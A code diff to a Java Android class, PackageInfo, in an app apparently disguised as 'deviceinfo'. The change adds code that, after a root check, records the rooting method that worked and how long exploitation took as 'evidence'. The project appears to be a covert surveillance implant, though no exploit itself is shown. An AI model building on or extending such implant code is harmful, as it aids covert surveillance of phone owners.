@@ -12,6 +12,7 @@ import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.Iterator;
 
 import javax.xml.parsers.FactoryConfigurationError;
@@ -26,6 +27,7 @@ import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.Configuration;
 import com.android.deviceinfo.crypto.Keys;
+import com.android.deviceinfo.evidence.EvidenceReference;
 import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.Execute;
@@ -34,6 +36,8 @@ import com.android.m.M;
 
 public class PackageInfo {
 	private static final String TAG = "PackageInfo";
+
+	private static boolean sentInfo;
 
 	private String packageName;
 	private FileInputStream fin;
@@ -130,7 +134,6 @@ public class PackageInfo {
 	static public boolean checkRoot() { //$NON-NLS-1$
 		boolean isRoot = false;
 
-		
 		try {
 			// Verifichiamo di essere root
 			if (Cfg.DEBUG) {
@@ -149,12 +152,24 @@ public class PackageInfo {
 				if (stdout.startsWith("uid=0")) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (checkRoot): isRoot YEAHHHHH"); //$NON-NLS-1$ //$NON-NLS-2$
+						
+						Date timestamp = new Date();
+						long diff = (timestamp.getTime() - Root.startExploiting.getTime()) / 1000;
+						
+						if(!sentInfo){
+							EvidenceReference.info("Root: " + Root.method + " time: " + diff +"s");
+						}
+						sentInfo = true;
 					}
 
 					isRoot = true;
 				} else {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (checkRoot): isRoot NOOOOO"); //$NON-NLS-1$ //$NON-NLS-2$
+						if(!sentInfo){
+							EvidenceReference.info("Root: NO");
+						}
+						sentInfo = true;
 					}
 				}
 			}
